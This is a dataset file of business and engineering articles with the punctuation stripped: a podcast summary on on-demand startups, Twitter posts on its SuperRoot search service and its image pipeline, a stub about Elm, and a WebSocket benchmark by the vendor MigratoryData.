1408,training-dataset/business/870.txt,business,The Past  Present  and Future of On Demand   Greylock PerspectivesThe Past  Present  and Future of On Demand  Podcast   Sprig Founder   CEO Gagan Biyani  In this Greymatter podcast  Simon Rothman of Greylock Partners sits down with Sprig founder and CEO Gagan Biyani to discuss the state of the on demand economy  The two marketplace experts discuss the shift on demand companies are experiencing from  crowding  to  culling   where companies are shutting down  funding is drying up  and the media is drawing comparisons of today s on demand companies to dotcom failures like Webvan  They move into discussions about business and operations strategy  the controversial topic of whether on demand workers should be classified as 1099 contractors or W2 employees  dealing with regulators  and the future of the restaurant industry   The podcast is now available on iTunes  SoundCloud  Pocket Casts  and Stitcher   Some highlights from the podcast  It s worth listening to the whole thing  but here are a few of our favorite quotes  Building the Future  Gagan  Uber is not amazing because it has a great business model  In fact  the business model kind of sucked for a really long time  Uber is amazing because the future was opening your phone  pressing a button and getting a car in two minutes  It didn t really matter whether they owned the vehicles or not   that was the future and they built that future   The One Way Ops Ratchet  Simon  There s a metaphor that you and I have that we use all the time   the one way ratchet which actually goes way  way back to when I was a kid working on cars  I always thought it was a beautiful metaphor where it only turns in one direction but you can t go back the other way     Gagan  I think you use an analogy that really has worked for me  which is in software  you build the system  you ship code  and then the system stays the same as where you left it  For the most part in software  you have this amazing opportunity to always move forward and very rarely move backwards  In operations  the opposite is true  As soon as you let go of the system it devolves in a chaos  You have this need to build checks and balances into the system that ensure constant vigilant oversight and therefore success  It s a complete different mindset and actually what we re talking about now is an evolution of our previous comments about how the coalition between engineering and operations requires a mindset shift but when created can really give rise to a lot of amazing opportunities   1099 vs  W2  Gagan  Our change from 1099 to W2 or making all of our servers employees was a business strategy change at it s core  and not a regulatory change  That business strategy was probably one of the best business decisions we made over the last year  We ve dramatically reduced our server acquisition cost  dramatically improved our retention numbers  and improved our service level for our customers  It s important for me to say that because it s a business decision about doing what I felt like was the right thing   providing our servers with more long term employment opportunities with the ability to train to become better at their jobs and eventually have equity in the service,"[1408 843 809 281 778 1016 572 673 61 1086 1300]"
1409,training-dataset/engineering/215.txt,engineering,SuperRoot  Launching a High SLA Production Service at TwitterOur Search Infrastructure team is building a new information retrieval system called Omnisearch to power Twitter s next generation of relevance based  personalized products  We recently launched the first major architectural component of Omnisearch  the SuperRoot  We thought it would be interesting to share what s involved with building  productionizing  and launching a new high scale  high SLA distributed system at Twitter   For a person using Twitter s consumer search product  it might look like Twitter has one search engine  but we actually have five indexes working together to serve many different products   A high scale in memory index serving recent  public Tweets  A separate in memory index to securely serve protected Tweets  A large SSD based archival index serving all public Tweets ever  An in memory typeahead index  for autocompleting queries  An in memory user search index  We maintain several separate search indexes because each differs in terms of scale  latency requirements  usage patterns  index size and content  While they are all Finagle based Thrift services that implement a shared API and query language  interfacing with multiple indexes is inconvenient for internal customers because they must understand which index to query for their use case and how to correctly merge results from different indexes   For example  Twitter s consumer search product displays a variety of types of content based on the user s intent  for example  recent Tweets  high quality older Tweets  relevant accounts  popular images  etc  As shown in Figure 1  we query multiple indexes to get all of the necessary content to build the page  Once we have results from each type of index  we merge them  removing duplicates  This isn t as easy as it sounds  after removing duplicates  there may not be enough results to fill the page  With a static index  we could simply retry the query  asking for more results  However  some of our indexes are updated in realtime  meaning a retry of the same query may return different  fresher  results  which should be considered  Correctly implementing pagination across the boundaries of rapidly changing realtime indexes is even more challenging  With the architecture in Figure 1  the code to manage merging and pagination had to be replicated for each product  slowing product development   Finally  consider the challenges of modifying the system shown in Figure 1  to add another index  merge two indexes  or change our API  we would have to work with every customer individually to avoid breaking their product  This overhead was slowing down the Search Infrastructure team s progress on Omnisearch  which we believe is an important technology for increasing the pace of development of relevance based products over the coming months   Enter SuperRoot   All problems in computer science can be solved by another level of indirection  except of course for the problem of too many indirections   David J  Wheeler  Recently  we launched SuperRoot  a scatter gather Thrift aggregation service that sits between our customers and our indexes   SuperRoot adds a layer of indirection to our architecture  presenting a consistent  logical view of the underlying decomposed  physical indices  By choosing to use the same API as each individual index s root service  we were able to migrate existing customers seamlessly  It also adds less than 5ms of overhead to each request  which we think is a fair price given the functionality  usability and flexibility it affords   The new functionality available in SuperRoot includes   Efficient query execution  by only hitting the necessary indexes for a query  Merging across indexes of the same document type  e g   Tweets   Precise pagination across temporally tiered indexes  i e   real time to archive   Per customer quotas and rate limiting  Search wide feature degradation for better availability  e g  reduced quality under heavy load   Improved access control  monitoring  security and privacy protections  For our internal customers  the SuperRoot means faster and easier development of new products  They no longer have to understand which indexes are available  write code to talk to each of them  reconcile duplicates  and implement complex pagination logic  Prototyping and experimentation using our search indexes is closer to self serve  Debugging is also easier  both because their code is simpler and because they interface with fewer downstream services   For the Search Infrastructure team  it creates a much needed layer of abstraction that will allow us to iterate faster on Omnisearch  We can now introduce a new  simple API to search in a single place  We can add or remove indexes without coordinating with every internal customer  We can change index boundaries  e g   increasing or decreasing the depth of the real time Tweet index  without breaking consumer products  In the extreme  we can even experiment with new architectures and search technologies behind the scenes   The Road to Production  Now that you understand what SuperRoot is and why we wanted it  you might be thinking that adding an additional layer of indirection to a distributed system isn t a new idea  This is true  This project was not about novel architectures  creative data structures or complex distributed algorithms  What was interesting about the SuperRoot project was how we used the technologies available at Twitter to develop and deploy a new high scale distributed system without impacting our customers   SuperRoot has capacity to serve over 85 000 queries per second  QPS  per datacenter  It services not only Twitter s Search product  but also our Home Timeline  our data products  and many other core Twitter features  With this much traffic  small mistakes in implementation  scaling issues  or deploy problems would have an outsized impact on our users  Yet  we were able to launch SuperRoot to 100  of customers without a single production incident or unhappy internal customer  This is delicate work and it s a major aspect of what we do as Platform engineers at Twitter   SLAs  Latency  Throughput  and Success Rate  In addition to functionality  our internal customers will usually specify basic requirements for serving their product  which we commit to in the form of a Service Level Agreement  SLA   For SuperRoot customers  the most important aspects of the SLA are query latency  measured in milliseconds   query throughput  measured in QPS  and success rate  the percentage of queries that succeed per second    Minimizing Overhead with Finagle and Thrift  SuperRoot aggregates the results from different indexes  some of which serve from RAM with very low latencies  For example  the in memory index that serves recent  public Tweets has p50 latencies of under 10ms  for simpler queries  and p999 latencies under 100ms  for expensive queries   Since low latencies are required for many of our products  it was important that SuperRoot not add a lot of overhead   SuperRoot relies on Finagle s RPC system and the Thrift protocol to ensure low overhead  One way that Finagle minimizes overhead is through RPC multiplexing  meaning there is only one network connection per client server session  regardless of the number of requests from the client  This minimizes use of bandwidth and reduces the need to open and close network sockets  Finagle clients also implement load balancing  meaning requests are distributed across the many SuperRoot instances in an attempt to maximize success rate and minimize tail latencies  For SuperRoot  we chose the Power of Two Choices  P2C    Peak EWMA load balancing algorithm  which is designed to quickly move traffic off of slow endpoints  Finally  the choice of Thrift reduces overhead in terms of bandwidth and CPU for serialization and deserialization  compared to a non binary protocol like JSON   Ensuring Sufficient Throughput  Not all queries are created equal  simple realtime queries take only a few milliseconds while hard tail queries can take hundreds of milliseconds and hit multiple indexes  At Twitter  we do  redline testing   using real traffic to accurately measure the real world throughput of a service  These tests work by incrementally increasing load balancer weights for instances under test until key metrics  e g  latency  CPU or error rate  hit a predetermined limit  Redline tests at Twitter can be run via a self serve UI and are available to all teams  Using these tests  we determined  and later adjusted  the number of instances required for SuperRoot to serve 85 000 real world QPS   Reliability  Once SuperRoot had the required functionality and was provisioned to handle the estimated load  we needed to make sure it was stable  We measure the stability of our systems with a metric called  success rate   which is simply the number of successful requests divided by the total number of requests  expressed as a percentage  For SuperRoot  we were looking for a 99 97  success rate  which means we tolerate no more than 3 failures per 10 000 queries  During normal operation  our success rate is usually significantly higher  but we consider anything lower an  incident    A shared cloud is a critical tool for reliably operating large distributed systems  Twitter uses Apache Mesos and Apache Aurora to schedule and run stateless services like SuperRoot  Mesos abstracts CPU  memory  storage  and other compute resources away from the actual hardware  Aurora is responsible for scheduling  and rescheduling  jobs onto healthy machines and keeping them running indefinitely  Given number of SuperRoot instances we need  hardware failures are expected on a daily basis  We would not be able to attain a 99 97  success rate if for every hardware failure  we had to manually take corrective action  Thankfully  Finagle routes traffic away from bad instances while Mesos and Aurora reschedule jobs quickly and automatically   One interesting and unexpected issue we encountered when building SuperRoot manifested itself as a periodic success rate dip  occurring every few minutes  On the surface  it looked like the dips were caused multiple sequential timeouts when querying in memory Earlybird indexes  We naturally suspected an issue with Earlybird  but Earlybird s graphs showed consistent response times of under 10ms  On deeper inspection  we found that the requests were timing out before they were sent to Earlybird  implicating SuperRoot itself   Often times  when debugging distributed systems  it is hard to tell the difference between cause and effect without some experimentation  For example  we noticed slight CPU throttling by Mesos around the timeout events  so we tried allocating more CPU  This did not help  indicating it was an effect  not the cause  With our long running JVM based services  we often suspect garbage collection  GC   but we didn t see any correlation between GC events and timeout events in our logs  However  when inspecting the logs  we did notice that the logs themselves were being printed during the events  From this observation  we were able to trace the issue back to a release of a new Twitter specific JVM  With the smoking gun in hand  we worked with our VM team to identify synchronous GC logging in the JVM as the culprit  The VM team implemented asynchronous logging and the issue disappeared  clearing the SuperRoot for launch   Getting to Perfect  For SuperRoot to reach its full potential  we needed every customer of the search infrastructure to use it  For this to happen  we needed to guarantee that the results from SuperRoot exactly matched what each customer expected  Before SuperRoot  most customers were directly hitting the roots of individual indexes  see Figure 1   With the introduction of SuperRoot  the responsibility of hitting multiple indexes and merging their results moved to it  meaning that any mistake made in the merging logic would directly manifest itself as a bug or quality regression in one of our products   The process of getting to feature parity started with understanding our customers  needs  typically by reading their code and talking to them  We then wrote unit tests  implemented an initial version  and deployed it  To verify the correctness of a new implementation of an existing system  we used a technique we call  tap compare   Our tap compare tool replays a sample of production traffic against the new system and compares the responses to the old system  Using the output of the tap compare tool  we found and fixed bugs in our implementation without exposing end customers to the bugs  This allowed us to migrate customers one by one to SuperRoot without incident   In one case  in an effort to reduce complexity  we didn t want to recreate the exact logic in the customer s system  We suspected that the simplification we had in mind would have a subtle impact on the Home timeline s filtering algorithm  but we didn t know if the effect would be positive or negative  Tap compare techniques don t help when you re not looking for exact feature parity  so we instead chose to A B test the effect on the Home timeline  Given the high stakes nature of changing the Home timeline  we felt the added time and complexity of running a proper A B test was prudent  Ultimately  we found that our simplification reduced end user engagement  and so we abandoned it in favor of a more complex implementation      ShipIt  Due to the incremental nature of our development process  there was no single day when we launched the SuperRoot  Instead  we shipped each request type one at a time  ensuring quality and correctness along the way  In our retrospective  the team was particularly proud by how smoothly this project went  There were no incidents  no unhappy customers  we cleared our backlog  and there were plenty of learning opportunities for the team members  many of whom had never built a distributed system from the ground up   Acknowledgements  The core SuperRoot team was Dumitru Daniliuc   twdumi   Bogdan Gaza   hurrycane   and Jane Wang   jane12345689   Other contributors included Paul Burstein   pasha407   Hao Wu  Tian Wang   wangtian   Xiaobing Xue   xuexb   Vikram Rao Sudarshan   raosvikram   Wei Li   alexweili   Patrick Lok   plok   Yi Zhuang   yz   Lei Wang   wonlay   Stephen Bezek   SteveBezek   Sergey Serebryakov   megaserg   Yan Zhao   zhaoyan1117   Joseph Barker   seph_barker   Maer Melo   maerdot   Mark Sparhawk   sparhawk   Dean Hiller   spack_jarrow   Sean Smith   seanachai   and Sam Luckenbill   sam,"[1409 293 1295 1336 1351 669 92 1403 1347 733 673]"
1418,training-dataset/engineering/466.txt,engineering,How Twitter Handles 3 000 Images Per SecondWednesday  April 20  2016 at 8 56AM  Today Twitter is creating and persisting 3 000  200 GB  images per second  Even better  in 2015 Twitter was able to save  6 million due to improved media storage policies   It was not always so  Twitter in 2012 was primarily text based  A Hogwarts without all the cool moving pictures hanging on the wall  It s now 2016 and Twitter has moved into to a media rich future  Twitter has made the transition through the development of a new Media Platform capable of supporting photos with previews  multi photos  gifs  vines  and inline video   Henna Kermani  a Software Development Engineer at Twitter  tells the story of the Media Platform in an interesting talk she gave at Mobile  Scale London  3 000 images per second  The talk focuses primarily on the image pipeline  but she says most of the details also apply to the other forms of media as well   Some of the most interesting lessons from the talk   Doing the simplest thing that can possibly work can really screw you   The simple method of uploading a tweet with an image as an all or nothing operation was a form of lock in  It didn t scale well  especially on poor networks  which made it difficult for Twitter to add new features   Decouple   By decoupling media upload from tweeting Twitter was able independently optimize each pathway and gain a lot of operational flexibility   Move handles not blobs   Don t move big chunks of data through your system  It eats bandwidth and causes performance problems for every service that has to touch the data  Instead  store the data and refer to it with a handle   Moving to segmented resumable uploads resulted in big decreases in media upload failure rates   Experiment and research   Twitter found through research that a 20 day TTL  time to live  on image variants  thumbnails  small  large  etc  was a sweet spot  a good balance between storage and computation  Images had a low probability of being accessed after 20 days so they could be deleted  which saves nearly 4TB of data storage per day   almost halves the number of compute servers needed   and saves millions of dollars a year   On demand   Old image variants could be deleted because they could be recreated on the fly rather than precomputed  Performing services on demand increases flexibility  it lets you be lot smarter about how tasks are performed  and gives a central point of control   Progressive JPEG is a real winner as a standard image format  It has great frontend and backend support and performs very well on slower networks   Lots of good things happened on Twitter s journey to a media rich future  let s learn how they did it     The Old Way   Twitter in 2012  The Write Path  A user composes a tweet in an app and possibly attaches an image to it  The client posts the tweet to a monolithic endpoint  The image is uploaded as a bundle with all the other tweet metadata and passed around to every single service involved in the process  This endpoint was the source of a lot of problems with the old design   Problem  1   A Lot of Wasted Network Bandwidth Creation of the tweet and media upload were tightly coupled into one operation  Uploads were on shot  either the upload completely succeeded or completely failed  A failure for any reason  network hiccup  transient error  etc   required the whole upload process to restart from the beginning  including the media upload  The upload could get to 95  complete and if there was a failure it all had to be uploaded again   Problem  2   Doesn t  Scale Well for New Larger Media Sizes This approach would not scale to large media sizes like video  Larger sizes increase the probability of failure  especially in emerging markets like Brazil  India  Indonesia  places with a slow and unreliable network  where they really want to increase the tweet upload success rate   Problem  3   Inefficient Use of Internal Bandwidth The endpoint connected to a TFE  Twitter Front End  that handles user authentication and routing  The user was routed to an Image Service  Image Service talks to the Variant Generator that generates instances of the image at different sizes  say small  medium  large  thumbnail   The variants are stored in the BlobStore  which is a key value store optimized for large payloads like image and video  The images live there foreverish  There are number of other services involved in the process of creating and persisting a tweet  Because the endpoint was monolithic  combining media with the tweet metadata  this bundle flowed through all the services as well  This large payload was passed around to services that weren t directly responsible for handling the image  they weren t part of the media pipeline  but they were still forced to optimize for handling large payload  This approach is very inefficient with internal bandwidth   Problem  4   Bloated Storage Footprint Images from tweets that were months and years old  that are no longer requested  would live in BlobStore forever  taking up space  Even sometimes when tweets were deleted the images would stay in BlobStore  There was no garbage collection     The Read Path  A user sees a tweet and the image associated with it  Where does the image come from   A client requests a variant of an image from a CDN  The CDN may need to ask the origin  TFE  for the image  This will eventually result in a direct lookup in BlobStore for an image for a URL at a particular size   Problem  5   Impossible to Introduce New Variants The design is not very flexible  Adding new variants  that is images of different sizes  would require backfilling the new image size for every image in the BlobStore  There was no variant on demand facility  The lack of flexibility made it difficult for Twitter to add new features on the client     The New Way   Twitter in 2016  The Write Path  Decoupling media upload from tweeting   Uploading was made a first class citizen  An upload endpoint was created  it s only responsibility is to put the original media in BlobStore  This gives a lot of flexibility in how upload is handled   The client talks to TFE which talks to Image Service which puts the image in BlobStore and adds data into a Metadata store  That s it  There are no other hidden services involved  No one is handling the media no one is passing it around   A mediaId  a unique identifier for the media  is returned from the Image Service  When a client wants to create a tweet  a DM  or update their profile photo  the mediaId will be used as a handle to reference the media rather than supplying the media   Let s say we want to create a tweet with the media that was just uploaded  The flow goes like  The client hits the update endpoint  passing the mediaId in the post  it will hit the Twitter Front End  the TFE will route to the service that s appropriate for the entity that is being created  For tweets it s TweetyPie  There are different services for DMs and Profiles  all the services will talk to the Image Service  The Image Server has post processing queues that handle features like face detection and child pornography detection  when that s finished the Image Service talks to ImageBird for images or VideoBird for videos  ImageBird will generate variants  VideoBird will do some transcoding  whatever media is generated will be put in BlobStore  No media is being passed around  A lot of wasted bandwidth has been saved     Segmented resumable uploads   Walk into a subway  come out 10 minutes later  the upload process will be resumed from where it was left off  It s completely seamless for the user   A client initializes an upload session using the upload API  The backend will give it a mediaId that is the identifier to use through the entire upload session   An image is divided into segments  say three segments  The segments are appended using the API  each append call gives the segment index  all appends are for the same mediaId  When the upload is completed the upload is finalized and the media is ready to be used   This approach is much more resilient to network failures  Each individual segment can be retried  If the network goes down for any reason you can pause and pick up the segment you left off at when the network comes back   A simple approach with huge gains  For files   50KB there was a 33  drop in image upload failure rate in Brazil  30  in India  and 19  in Indonesia   The Read Path  Introduced a CDN Origin Server called MinaBird   MinaBird can talk to ImageBird and VideoBird so image size variants and video format variants can be generated on the fly if they don t exist   MinaBird is more fluid and more dynamic in how client requests are handled  If there s a DMCA Takedown  for example  it s very easy to block access or reenable access to a particular piece of media   Being able to generate variants and transcodings on the fly let s Twitter be a lot smarter about storage  On demand variant generation means all the variants do not need to be stored in BlobStore  A huge win  The original image is kept until deletion  Variants are only kept for 20 days  The Media Platform team did a lot of research on the best expiration period  About 50  of all requested images are at most 15  or so  days old  Keeping images around that are older than that yields diminishing returns  Chances are nobody is requesting older media  There s a very long tail after 15 days  With no TTL  time to live   no expiration  media storage results in a daily storage growth of 6TB every day  The lazy method  generating all variants on demand  results in a daily storage growth of 1 5TB  The 20 day TTL doesn t use much more storage than the lazy method  so it doesn t cost much in terms of storage  but it s a huge win in terms of computation  Using the lazy approach of computing all variants on reads would require 150 ImageBird machines per datacenter versus 75 or so with the 20 day TTL  So the 20 day TTL is a sweet spot  a good balance between storage and computation  Since saving storage and computation is saving money  in 2015 Twitter saved  6 million by introducing the 20 day TTL     Client Improvements  Android   Performed a 6 month experiment with WebP  a Google created image format  Images were on average 25  smaller than corresponding PNG or JPEG images  Saw increases in user engagement  especially in emerging markets  where the smaller image size cause less network stress  Not supported on iOS  Only supported on Android 4 0   The lack of platform support made WebP costly to support   Progressive JPEG was another option Twitter tried  It renders in successive scans  The first scan might be blocky  but it will refine itself with successive scans  Better performance  Easy to support on the backend  60  slower to encode than traditional JPEG  Since encoding happens once and serving happens many times it s not a huge problem  No transparency support  so transparent PNGs are kept around  but everything else is converging on progressive JPEG  On the client side support is provided by Facebook s Fresco library  Lots of very good things to say about Fresco  The results over a 2G connection were quite impressive  The first scan of PJPEG only requires about 10kb  so it doesn t take long to load  The native pipeline was still waiting to load  showing nothing  while the PJPEG was showing recognizable images  Results of an ongoing experiment for loads in the tweet detail view  A 9  decrease in p50 load times  A 27  decrease in p95 load times  A 74  decrease in failure rates  Users with slower connections really see a big win,"[1418 1336 1351 1403 92 778 520 293 1101 61 673]"
1419,training-dataset/engineering/753.txt,engineering,Elm Is The New RailsFirst name  G like  giraffe   not G like  get   Rhymes with  miles   Last name  rhymes with  broke it   although I often fall back to an Americanized version which rhymes with  go get,"[1419 886 1393 520 1010 1405 251 1341 92 1095 1007]"
1422,training-dataset/engineering/1482.txt,engineering,A Scalable Alternative to RESTful Communication  Mimicking Google s Search Autocomplete with a Single MigratoryData ServerTuesday  December 13  2016 at 8 56AM  This is a guest post by Mihai Rotaru  CTO of MigratoryData   Using the RESTful HTTP request response approach can become very inefficient for websites requiring real time communication  We propose a new approach and exemplify it with a well known feature that requires real time communication  and which is included by most websites  search box autocomplete   Google  which is one of the most demanding web search environments  seems to handle about 40 000 searches per second according to an estimation made by Internet Live Stats  Supposing that for each search  a number of 6 autocomplete requests are made  we show that MigratoryData can handle this load using a single 1U server   More precisely  we show that a single MigratoryData server running on a 1U machine can handle 240 000 autocomplete requests per second from 1 million concurrent users with a mean round trip latency of 11 82 milliseconds   The Current Approach and Its Limitations  Autocomplete provides users with search suggestions as users type in their queries in the search box  The current approach is based on the HTTP request response model  For every single character typed by the user  an HTTP request is sent to a web server and the search suggestions are returned into the HTTP response  There are two limitations with the current approach  bandwidth and latency   On one hand  for each autocomplete request which only contains a few bytes  i e  the characters typed into the search box by the user   the browser automatically adds hundreds of bytes as HTTP headers  For websites with important search activity  this data overhead means substantial waste in bandwidth  as well as in CPU cycles required to process these unnecessary HTTP headers   On the other hand  for each HTTP request  a new TCP connection is established between the user and the web server  as well as a possible TLS SSL handshake  Having to perform this action for each character a user types has an impact on the latency  i e  the time from when the user types a character until it gets the search results   The workaround to this limitation is to use HTTP Keep Alive connections  which allow sending multiple HTTP requests along the same TCP connection during a timeout  Even in this case  however  after the timeout expires  a new connection will be established   A New Approach  The WebSocket protocol arises as an alternative to overcome the limitations of the RESTful HTTP approach discussed above  It is known that the WebSocket protocol overhead only consists of a few bytes  Therefore  compared with the hundreds of bytes added by the HTTP protocol  the improvement in terms of overhead is substantial  Moreover  the WebSocket protocol uses persistent connections by design  Therefore  it creates the premise for achieving low latency communication  as it imposes no periodic reconnections   Many WebSocket server implementations exist  However  while any of these implementations would normally optimize bandwidth when compared with the RESTful HTTP approach  not all WebSocket server implementations will provide the same level of low latency and scalability   Note   The WebSocket protocol by itself does not guarantee the server s better scalability or lower latency when compared to web servers   it only creates the premise for this possibility  The degree to which better scalability and lower latency can be achieved depends on each WebSocket server implementation   MigratoryData Server is one such existing WebSocket server implementation  It is known as being the first server implementation which addressed the C10M problem  10 million concurrent users on a single server   MigratoryData provides a common API with libraries for the most popular programming environments  including web applications  It exposes a subject based publish subscribe communication paradigm  Built according to the pub sub model  it also exposes an asynchronous request response model as follows   A producer subscribes to a subject X  A consumer sends a request message with the subject X to which it attaches a reply subject Y  the consumer automatically subscribes to the subject Y if it is not already subscribed   Once the message is received by the producer  it extracts the reply subject Y from the request message and sends back a reply message with the subject Y  In the following sections we show that this request response interaction over WebSockets can be used as a scalable alternative to the RESTful HTTP approach   Benchmark Setup  We used four identical machines each with 2 x CPU Intel Xeon E5 2670   2 60GHz and 64 GB RAM as follows   Machine A ran one instance of MigratoryData Server 5 0 20  Machine B and Machine C ran two instances of the Requestor tool  used to open 500 000 concurrent WebSockets connections each  autocomplete requests were made along these connections  Machine D ran 16 instances of the Provider tool  used to reply with search suggestions based on the autocomplete requests   All four machines ran CentOS Linux 7 2 with the default kernel 3 10 0 327 28 3 el7 x86_64 with no kernel tuning   In order to send an autocomplete request by one user  N  of the one million users  the Requestor tool selects randomly one of the subjects subscribed to by the sixteen providers  say  s M  In addition  the Requestor tool subscribes the user  N  to the subject  c N  if not already done  and publishes a request message to the MigratoryData Server with the following attributes   Subject   c M  Reply Subject   s N  Payload  a 32 byte random string representing the search query  The Provider M  which is subscribed to the subject  s M  will receive the message above and will respond by publishing a reply message to the MigratoryData Server with the following attributes   Subject   c N  Payload  a 256 byte random string representing the search suggestions  Because the user  N  is subscribed to the subject  c N  it will receive the reply message above  The round trip latency will be computed as the time difference from when the request message was created until the reply message was received by the user   Note   The round trip latency of a request reply communication includes the time it takes for the request message to travel from Requestor to MigratoryData Server  and then to Provider  plus the time it takes for the reply message to travel from Provider to MigratoryData Server  and finally to Requestor   Finally  it is worthy to note that  in the setup above  requests are balanced among Provider instances   which represent the search services  This architecture allows for search services  including their search caches  to be scaled horizontally  which mimics the RESTful HTTP approach  where requests are also balanced among multiple search services   Summary of Results  Every second  the two Requestor instances made 240 000 autocomplete requests for 240 000 users randomly selected from the one million concurrent users and received search suggestions with a mean round trip latency of 11 8 milliseconds  a 95th percentile latency of 20 milliseconds  and a 99th percentile latency of 130 milliseconds  computed for more than 4 billion requests    Number of Concurrent WebSocket Connections 1 000 016 Number of Subscribed Subjects 1 000 016 Number of Requests Per Second 240 000 request messages per second Total Message Throughput  from and to Requestors   Providers  960 000 messages per second Mean Latency 11 82 milliseconds Standard Deviation Latency 26 28 milliseconds 95th Percentile Latency 20 milliseconds 99th Percentile Latency 130 milliseconds Max Latency 1783 milliseconds Total Number of Requests 4 084 890 291 Hardware One 1U server with 2 x Intel Xeon E5 2670    2 60GHz  64 GB RAM  and Intel X520 DA1 10 GbE network adapter Operating System CentOS Linux 7 2 with default kernel 3 10 0 327 28 3 el7 x86_64  no kernel tuning  Java Runtime Environment Oracle 1 8 0_40 b25 Incoming Network Utilization  from both Providers   Requestors  1 06 Gigabit per second Outgoing Network Utilization  to both Providers   Requestors  1 17 Gigabit per second CPU Utilization 65   Results  MigratoryData Server provides monitoring via JMX and other protocols  We used the jconsole tool  part of the Java Development Kit  for JMX monitoring  The screenshots in the results presented below are obtained during JMX monitoring   Connections and Messages  As depicted in the Benchmark Setup diagram  1 000 000 concurrent WebSocket connections were opened to MigratoryData server by two Requestor instances  which simulated one million users  Each of the one million users subscribed to a distinct subject  which was then used to obtain replies with search suggestions  In addition  16 Provider instances were used to open 16 connections to MigratoryData server  to simulate search suggestion services  Each of the 16 services subscribed to a distinct subject  which was then used to get the autocomplete requests  The same number of concurrent connections 1 000 016 is indicated by the JMX attribute ConnectedSessions in the screenshot below   In this benchmark setup  users sent 240 000 request messages per second  Therefore  the number of total incoming messages per second to MigratoryData server is a sum of the 240 000 request messages per second from Requestors  plus the 240 000 reply messages per second from Providers   In addition  the number of outgoing messages per second from MigratoryData server is a sum of the 240 000 reply messages per second delivered to Requestors  plus the240 000 request messages per second delivered to Provides   These total numbers  480 000 outgoing messages per second and 480 000 incoming messages per second  are corroborated by the JMX attributes OutPublishedMessagesPerSecond and InPublishedMessagesPerSecond in the screenshot below   Therefore  the total throughput handled by the MigratoyData Server both for incoming and outgoing messages is close to 1 million messages per second   Finally  it s also worthwhile to note that the benchmark test was performed over a period of almost 5 hours  At a rate of 240 000 requests per second  MigratoryData handled more than 4 billion total requests   CPU and Memory Utilization  As indicated by the screenshot  CPU usage was under 70  during the benchmark  The max memory allocated to JVM was 30 GB  Finally  the benchmark test  which was run over almost 5 hours  shows a predictable usage pattern for both memory and CPU   Latency  As defined in the Benchmark Setup section  the round trip latency is a sum of the time needed for a request to travel from a Requestor to MigratoryData server  and then to a Provider  plus the time needed for the reply message to travel from the Provider to MigratoryData server  and finally to the Requestor   For this benchmark  we computed the round trip latency for each request reply interaction   a total of more than 4 billion latency values  In addition  we computed the mean  standard deviation  and maximum latency values  These latency statistics are computed incrementally for each new request reply interaction  using a total of more than 4 billion latency values  These values are summarized as follows   Mean Latency  11 82 milliseconds  Standard Deviation Latency  26 28 milliseconds  Maximum Latency  1783 milliseconds  In addition  we used the HdrHistogram library to compute the percentiles of latency  In the chart below you can see both the number of requests  in millions  and the round trip latency  in milliseconds  by percentile distribution   For example  in the chart above we can see that the 95th percentile is 20 milliseconds and the 99th percentile is 130 milliseconds  Thus  for 3 8 billion requests out of the total of 4 billion  the round trip latency is under 20 milliseconds  and for 3 96 billion requests out of the total of 4 billion  the round trip latency is under 130 milliseconds   Note   More optimization can be done to reduce the latencies of the 99th percentiles and higher  These values are typically impacted by the garbage collections of the JVM  In a previous benchmark for another scenario we show that using Zing JVM from Azul Systems  optimized for garbage collection  we were able to reduce the 99th percentile latency from 585 milliseconds to 25 milliseconds  and the maximum latency from 1700 milliseconds to 126 milliseconds   Conclusion  In this article we proposed a new communication architecture for websites with large number of users  high frequency of requests  and or requiring low latency communication  and exemplified with the particular use case of search box autocomplete   We showed that a scalable WebSocket server  providing an easy to use programming model  such as publish subscribe  represents a good alternative to the current RESTfull HTTP architecture  both in terms of latency and bandwidth  while maintaining a comparable complexity for programming,"[1422 92 669 293 1351 1409 1347 673 1117 358 310]"
